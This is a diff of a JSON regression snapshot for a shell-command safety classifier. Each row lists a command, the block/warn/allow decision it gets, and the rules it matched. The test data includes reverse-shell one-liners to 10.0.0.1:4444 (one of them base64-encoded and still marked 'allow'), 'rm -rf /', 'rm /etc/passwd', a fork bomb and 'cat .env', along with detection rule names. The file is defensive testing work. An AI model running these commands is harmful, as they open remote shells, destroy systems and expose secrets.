@@ -1,96 +1,13 @@
 {
   "corpus": "baseline/baseline_corpus.jsonl",
-  "count": 29,
-  "git_commit": "7f3e0c08ed9dc1ad7ccbd403589cc05fbbe120c8",
+  "count": 32,
+  "git_commit": "651b48575f5ac1f317e4699a2a13aed1d3b1a4af",
   "rows": {
-    "ki01": {
-      "command": "rm -rf node_modules",
-      "decision": "block",
-      "expectation": "known_issue",
-      "id": "ki01",
-      "level": "blocked",
-      "matched_rules": [
-        "fs.rm_recursive_force"
-      ],
-      "mode": "soc",
-      "score": 70
-    },
-    "ki02": {
-      "command": "rm -rf ./build",
-      "decision": "block",
-      "expectation": "known_issue",
-      "id": "ki02",
-      "level": "blocked",
-      "matched_rules": [
-        "fs.rm_recursive_force"
-      ],
-      "mode": "soc",
-      "score": 70
-    },
-    "ki03": {
-      "command": "rm -rf /tmp/mycache",
-      "decision": "block",
-      "expectation": "known_issue",
-      "id": "ki03",
-      "level": "blocked",
-      "matched_rules": [
-        "context.sensitive_target",
-        "fs.rm_recursive_force"
-      ],
-      "mode": "soc",
-      "score": 90
-    },
-    "ki04": {
-      "command": "ls -la ~/.ssh/authorized_keys",
-      "decision": "warn",
-      "expectation": "known_issue",
-      "id": "ki04",
-      "level": "dangerous",
-      "matched_rules": [
-        "persistence.authorized_keys_write"
-      ],
-      "mode": "soc",
-      "score": 45
-    },
-    "ki05": {
-      "command": "cat notes.environment",
-      "decision": "warn",
-      "expectation": "known_issue",
-      "id": "ki05",
-      "level": "caution",
-      "matched_rules": [
-        "secret.env_token"
-      ],
-      "mode": "soc",
-      "score": 30
-    },
-    "ki06": {
-      "command": "stat deploy.env.example",
-      "decision": "warn",
-      "expectation": "known_issue",
-      "id": "ki06",
-      "level": "caution",
-      "matched_rules": [
-        "secret.env_token"
-      ],
-      "mode": "soc",
-      "score": 30
-    },
     "ki07": {
       "command": "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash",
       "decision": "allow",
       "expectation": "known_issue",
       "id": "ki07",
-      "level": "safe",
-      "matched_rules": [],
-      "mode": "soc",
-      "score": 0
-    },
-    "ki08": {
-      "command": "nc -e /bin/bash 10.0.0.1 4444",
-      "decision": "allow",
-      "expectation": "known_issue",
-      "id": "ki08",
       "level": "safe",
       "matched_rules": [],
       "mode": "soc",
@@ -196,6 +113,60 @@
       "mode": "soc",
       "score": 0
     },
+    "la11": {
+      "command": "rm -rf node_modules",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la11",
+      "level": "safe",
+      "matched_rules": [
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 6
+    },
+    "la12": {
+      "command": "rm -rf ./build",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la12",
+      "level": "safe",
+      "matched_rules": [
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 6
+    },
+    "la13": {
+      "command": "ls -la ~/.ssh/authorized_keys",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la13",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la14": {
+      "command": "cat notes.environment",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la14",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
+    "la15": {
+      "command": "stat deploy.env.example",
+      "decision": "allow",
+      "expectation": "lock_allow",
+      "id": "la15",
+      "level": "safe",
+      "matched_rules": [],
+      "mode": "soc",
+      "score": 0
+    },
     "lb01": {
       "command": "rm -rf /",
       "decision": "block",
@@ -203,12 +174,12 @@
       "id": "lb01",
       "level": "blocked",
       "matched_rules": [
-        "context.sensitive_target",
         "fs.delete_root",
+        "fs.destructive_critical_path",
         "fs.rm_recursive_force"
       ],
       "mode": "soc",
-      "score": 185
+      "score": 181
     },
     "lb02": {
       "command": "rm -rf /*",
@@ -217,11 +188,12 @@
       "id": "lb02",
       "level": "blocked",
       "matched_rules": [
-        "context.sensitive_target",
+        "fs.delete_root",
+        "fs.destructive_critical_path",
         "fs.rm_recursive_force"
       ],
       "mode": "soc",
-      "score": 90
+      "score": 181
     },
     "lb03": {
       "command": "rm --no-preserve-root -rf /",
@@ -230,12 +202,12 @@
       "id": "lb03",
       "level": "blocked",
       "matched_rules": [
-        "context.sensitive_target",
         "fs.delete_root",
+        "fs.destructive_critical_path",
         "fs.rm_recursive_force"
       ],
       "mode": "soc",
-      "score": 185
+      "score": 181
     },
     "lb04": {
       "command": ":(){ :|:& };:",
@@ -280,11 +252,10 @@
       "id": "lb07",
       "level": "blocked",
       "matched_rules": [
-        "context.sensitive_target",
         "disk.mkfs"
       ],
       "mode": "soc",
-      "score": 92
+      "score": 72
     },
     "lb08": {
       "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
@@ -333,6 +304,70 @@
       ],
       "mode": "soc",
       "score": 66
+    },
+    "lb12": {
+      "command": "nc -e /bin/bash 10.0.0.1 4444",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb12",
+      "level": "blocked",
+      "matched_rules": [
+        "shell.reverse_shell_tcp"
+      ],
+      "mode": "soc",
+      "score": 70
+    },
+    "lb13": {
+      "command": "rm -rf /etc",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb13",
+      "level": "blocked",
+      "matched_rules": [
+        "fs.delete_system_path",
+        "fs.destructive_critical_path",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 166
+    },
+    "lb14": {
+      "command": "rm /etc/passwd",
+      "decision": "block",
+      "expectation": "lock_block",
+      "id": "lb14",
+      "level": "blocked",
+      "matched_rules": [
+        "fs.delete_critical_file",
+        "fs.destructive_critical_path"
+      ],
+      "mode": "soc",
+      "score": 160
+    },
+    "lw01": {
+      "command": "rm -rf /tmp/mycache",
+      "decision": "warn",
+      "expectation": "lock_warn",
+      "id": "lw01",
+      "level": "caution",
+      "matched_rules": [
+        "fs.destructive_abs_path",
+        "fs.rm_recursive_force"
+      ],
+      "mode": "soc",
+      "score": 20
+    },
+    "lw02": {
+      "command": "cat .env",
+      "decision": "warn",
+      "expectation": "lock_warn",
+      "id": "lw02",
+      "level": "caution",
+      "matched_rules": [
+        "secret.env_token"
+      ],
+      "mode": "soc",
+      "score": 30
     }
   },
   "schema": "cybershell-behavior-snapshot/1"
